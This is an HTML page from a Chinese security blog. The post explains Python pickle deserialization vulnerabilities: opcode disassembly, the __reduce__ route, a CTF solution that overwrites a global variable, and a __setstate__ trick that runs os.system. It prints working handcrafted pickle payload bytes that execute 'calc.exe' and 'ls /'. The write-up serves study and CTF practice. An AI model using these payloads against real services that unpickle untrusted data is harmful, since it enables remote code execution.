@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="python反序列化漏洞python序列化的方式python序列化用的是pickle库，（也有用到cpickle库的）。 12345678910111213import pickleimport pickletoolsclass student():    def __init__(self):        self.name = &apos;test&apos;        self.grade = 666a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python反序列化漏洞">
+<meta property="og:url" content="http://yoursite.com/year/03/14/python反序列化漏洞/index.html">
+<meta property="og:site_name" content="Yiyangqianxixxxx">
+<meta property="og:description" content="python反序列化漏洞python序列化的方式python序列化用的是pickle库，（也有用到cpickle库的）。 12345678910111213import pickleimport pickletoolsclass student():    def __init__(self):        self.name = &apos;test&apos;        self.grade = 666a">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1044.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583983498767.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583984423724.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583991596246.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583991650895.png">
+<meta property="og:image" content="c:/Users/yh/AppData/Roaming/Typora/typora-user-images/1583991903951.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583992098082.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583995686977.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1583995783025.png">
+<meta property="og:updated_time" content="2020-03-16T07:10:49.018Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="python反序列化漏洞">
+<meta name="twitter:description" content="python反序列化漏洞python序列化的方式python序列化用的是pickle库，（也有用到cpickle库的）。 12345678910111213import pickleimport pickletoolsclass student():    def __init__(self):        self.name = &apos;test&apos;        self.grade = 666a">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1044.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/year/03/14/python反序列化漏洞/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>python反序列化漏洞 | Yiyangqianxixxxx</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+  <link rel="stylesheet" href="/dist/APlayer.min.css">
+  <div id="aplayer"></div>
+  <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+  <script type="text/javascript" src="/dist/music.js"></script>
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Yiyangqianxixxxx</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-schedule">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/schedule/" rel="section"><i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>日程表</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/year/03/14/python反序列化漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yan">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yiyangqianxixxxx">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">python反序列化漏洞
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-14 18:00:00" itemprop="dateCreated datePublished" datetime="2020-03-14T18:00:00+08:00">2020-03-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-03-16 15:10:49" itemprop="dateModified" datetime="2020-03-16T15:10:49+08:00">2020-03-16</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/总结记录/" itemprop="url" rel="index"><span itemprop="name">总结记录</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/year/03/14/python反序列化漏洞/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/year/03/14/python反序列化漏洞/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+            <span id="/year/03/14/python反序列化漏洞/" class="leancloud_visitors" data-flag-title="python反序列化漏洞">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读次数：</span>
+              
+                <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">4.7k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">4 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="python反序列化漏洞"><a href="#python反序列化漏洞" class="headerlink" title="python反序列化漏洞"></a>python反序列化漏洞</h3><h4 id="python序列化的方式"><a href="#python序列化的方式" class="headerlink" title="python序列化的方式"></a>python序列化的方式</h4><p>python序列化用的是pickle库，（也有用到cpickle库的）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.name = <span class="string">'test'</span></span><br><span class="line">        self.grade = <span class="number">666</span></span><br><span class="line"></span><br><span class="line">a = student()</span><br><span class="line">s = pickle.dumps(a)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="string">b'\x80\x04\x959\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x07student\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x04test\x94\x8c\x05grade\x94M\x9a\x02ub.'</span></span><br></pre></td></tr></table></figure>
+<p>​    如上就是python序列化数据的基本方式，输出的一大堆看不懂的字符就是序列化后的数据。python反序列化用到的是pickle.loads()方法，调用 Unpickler类来实现反序列化。</p>
+<p>​    而unpickle所有的数据操作都在栈上，上面的一大串序列化的数据通过unpickle读入后，会被翻译成一堆机器可以看懂的指令操作，通过这些操作来告诉机器应该怎样处理这些数据。利用pickletools可以反汇编这个序列化后的数据，查看具体进行了什么操作。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1044.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583983498767.png" alt></p>
+<p>可以看到下面输出的很像汇编指令了，可以清晰的看到每条指令具体做了什么，然后我们还可以用</p>
+<p>pickletools.optimize()来优化这些指令，去除掉一些不必要的指令。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583984423724.png" alt></p>
+<p>然后来分析这些指令具体做了什么。（参考知乎 阮行止师傅的）</p>
+<p>​    首先字符串的第一个字节是\x80，机器看到这个操作符，就会再读一个字符串，读到了\x03，它告诉机器这是一个依据3号协议序列化的字符串（字符串序列化的协议有0、2、3、4这四个版本，默认是3号协议），然后这部分操作结束。</p>
+<p>​    然后读入c操作符，它连续读入两个字符串 module和name，规定以\n为分割，然后把module.name压进栈中，在这里也就是把 _ _ <em>main</em> _ _.student压进栈中。</p>
+<p>​    然后读到了）这个操作符，它的作用是”把一个空的tuple压入当前栈“。处理完这个操作符之后读到了\x81这个操作符，它的作用是：从栈中弹出一个元素记为 args；再弹出一个元素记为cls。接下来，执行cls._ _ <em>new</em> _ _(cls,*args)。意思就是从栈中弹出一个参数和一个class，然后利用这个参数实例化class，把得到的实例压入栈中。</p>
+<p>​    然后读入一个}，它的意思是”把一个空的dict压入栈中“，然后是mark操作符，它的作用是”把当前栈这个整体作为一个list，压进前序栈，把当前栈清空。“</p>
+<p>​    然后是MARK之后的内容，下一个操作符是X，它的意义是：读入一个字符串，以\n为结尾，然后把这个字符串压入栈中，这里的M操作符也是一样的意思，在这四个元素都压入栈之后，当前栈里面的元素是name,test,grade,666，前序栈里的内容是一个空的student实例以及一个空的dict。</p>
+<p>​    然后遇到了u操作符，它将当前栈的所有内容放入一个数组arr，然后把当前栈恢复到MARK时的状态，执行完成后，arr=[‘name’,’test’,’grade’,666]；当前栈里是一个空的student实例和一个空的dict。然后拿出dict，两个一组的读入arr里的元素，一个作为key，一个作为value。当前栈里的元素就变成了一个空的student实例，和一个dict[‘name’:’test’,’grade’:666]</p>
+<p>​    下一个指令码是b，就是BUILD指令，它把当前栈栈顶存入state，然后弹掉，把当前栈栈顶记为inst，然后弹掉。利用state这一系列的值来更新实例inst。把得到的对象放入当前栈。</p>
+<p>​    虽然我也不知道上面到底说了些啥，但是最后当前栈里面只剩下了一个实例student，并且拥有我们传入的属性和值。</p>
+<h4 id="python反序列化漏洞的出现-reduce"><a href="#python反序列化漏洞的出现-reduce" class="headerlink" title="python反序列化漏洞的出现 reduce"></a>python反序列化漏洞的出现 reduce</h4><p>网上最多的介绍python反序列化漏洞的成因都是来自 _ _ <em>reduce</em> _ _方法，它的指令码是R。利用的方式很简单，只要在正常的类里面加上 _ _ reduce _ _  方法，并且方法内构造一个恶意的指令。</p>
+<p>这样序列化出来的数据，我们可以根据这个指令来自己构造</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583991596246.png" alt></p>
+<p>为什么在序列化的字符串中会出现q，其实是因为optimize把q指令码（也就是put给省略了）</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583991650895.png" alt></p>
+<p>这样就可以看见指令中有q了，但是这个q可有可无，无论加不加都可以执行命令。</p>
+<p><img src="C:\Users\yh\AppData\Roaming\Typora\typora-user-images\1583991903951.png" alt="1583991903951"></p>
+<p>如图直接去掉q指令码，也是可以执行命令的。</p>
+<h4 id="全局变量包含-c指令码"><a href="#全局变量包含-c指令码" class="headerlink" title="全局变量包含 c指令码"></a>全局变量包含 c指令码</h4><p>这题是出现在攻防世界战疫赛上的，一开始我一直想着rce，没想到可以使用变量覆盖。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583992098082.png" alt></p>
+<p>原题大概是这样的，这里少了一个判断module是否为main的条件，不过无关紧要，这里直接看解法。传入payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&apos;\x80\x03c__main__\nsecret\n&#125;(Vname\nVrua\nVgrade\nVwww\nub0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&apos;</span><br></pre></td></tr></table></figure>
+<p>这样一看是很迷惑，那就用pickletools打印出来看看，到底执行了什么操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &apos;__main__ secret&apos;</span><br><span class="line">   19: &#125;    EMPTY_DICT</span><br><span class="line">   20: (    MARK</span><br><span class="line">   21: V        UNICODE    &apos;name&apos;</span><br><span class="line">   27: V        UNICODE    &apos;rua&apos;</span><br><span class="line">   32: V        UNICODE    &apos;grade&apos;</span><br><span class="line">   39: V        UNICODE    &apos;www&apos;</span><br><span class="line">   44: u        SETITEMS   (MARK at 20)</span><br><span class="line">   45: b    BUILD</span><br><span class="line">   46: 0    POP</span><br><span class="line">   47: c    GLOBAL     &apos;__main__ Student&apos;</span><br><span class="line">   65: )    EMPTY_TUPLE</span><br><span class="line">   66: \x81 NEWOBJ</span><br><span class="line">   67: &#125;    EMPTY_DICT</span><br><span class="line">   68: (    MARK</span><br><span class="line">   69: X        BINUNICODE &apos;name&apos;</span><br><span class="line">   78: X        BINUNICODE &apos;rua&apos;</span><br><span class="line">   86: X        BINUNICODE &apos;grade&apos;</span><br><span class="line">   96: X        BINUNICODE &apos;www&apos;</span><br><span class="line">  104: u        SETITEMS   (MARK at 68)</span><br><span class="line">  105: b    BUILD</span><br><span class="line">  106: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
+<p>根据前面的指令内容可以知道，先将secret引入，然后压入一个dict内容为我们自定义的，然后执行BUILD指令，改写了原本题目中引入的secret为我们传入的值，弹掉栈顶，再传入一个正常的Student序列化之后的字符串，内容也是我们自定义。</p>
+<p>所以name和grade值就相等了。</p>
+<p>在我的实验过程中发现，如果是自己序列化构造的数据，构造出的指令码并不是V，而是X，且会有读入tuple和创建对象实例的操作，在修改题目中的secret值的时候我们是不需要这两个操作的，所以可以手动去掉，也就是说，下一次题目得自己手搓序列化后的数据。然后用pickletools构造器查看是否合法就行了。</p>
+<h4 id="不需要reduce也能RCE的方法"><a href="#不需要reduce也能RCE的方法" class="headerlink" title="不需要reduce也能RCE的方法"></a>不需要reduce也能RCE的方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &apos;__main__ Student&apos;</span><br><span class="line">   20: )    EMPTY_TUPLE</span><br><span class="line">   21: \x81 NEWOBJ</span><br><span class="line">   22: &#125;    EMPTY_DICT</span><br><span class="line">   23: (    MARK</span><br><span class="line">   24: V        UNICODE    &apos;__setstate__&apos;</span><br><span class="line">   38: c        GLOBAL     &apos;os system&apos;</span><br><span class="line">   49: u        SETITEMS   (MARK at 23)</span><br><span class="line">   50: b    BUILD</span><br><span class="line">   51: V    UNICODE    &apos;calc.exe&apos;</span><br><span class="line">   61: b    BUILD</span><br><span class="line">   62: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
+<p>原理就是阮行止师傅说的这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里的实现方式也就是上文的注所提到的：如果inst拥有__setstate__方法，则把state交给__setstate__方法来处理；否则的话，直接把state这个dist的内容，合并到inst.__dict__ 里面。</span><br><span class="line"></span><br><span class="line">　　它有什么安全隐患呢？我们来想想看：Student原先是没有__setstate__这个方法的。那么我们利用&#123;&apos;__setstate__&apos;: os.system&#125;来BUILE这个对象，那么现在对象的__setstate__就变成了os.system；接下来利用&quot;ls /&quot;来再次BUILD这个对象，则会执行setstate(&quot;ls /&quot;) ，而此时__setstate__已经被我们设置为os.system，因此实现了RCE.</span><br></pre></td></tr></table></figure>
+<p>上面的代码照抄一下就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&apos;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcalc.exe\nb.&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1583995686977.png" alt></p>
+<p>成功弹出计算器，但是后面会报错，因为没有传入Student属性，所以可以直接在后面加上。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1583995783025.png" alt></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&apos;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89132768</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/year/03/10/src挖掘经验/" rel="next" title="src漏洞挖掘笔记">
+                <i class="fa fa-chevron-left"></i> src漏洞挖掘笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/year/03/16/星盟awd复盘/" rel="prev" title="星盟awd复盘">
+                星盟awd复盘 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+    
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Yan</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#python反序列化漏洞"><span class="nav-number">1.</span> <span class="nav-text">python反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python序列化的方式"><span class="nav-number">1.1.</span> <span class="nav-text">python序列化的方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python反序列化漏洞的出现-reduce"><span class="nav-number">1.2.</span> <span class="nav-text">python反序列化漏洞的出现 reduce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#全局变量包含-c指令码"><span class="nav-number">1.3.</span> <span class="nav-text">全局变量包含 c指令码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不需要reduce也能RCE的方法"><span class="nav-number">1.4.</span> <span class="nav-text">不需要reduce也能RCE的方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yan</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">50k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">45 分钟</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
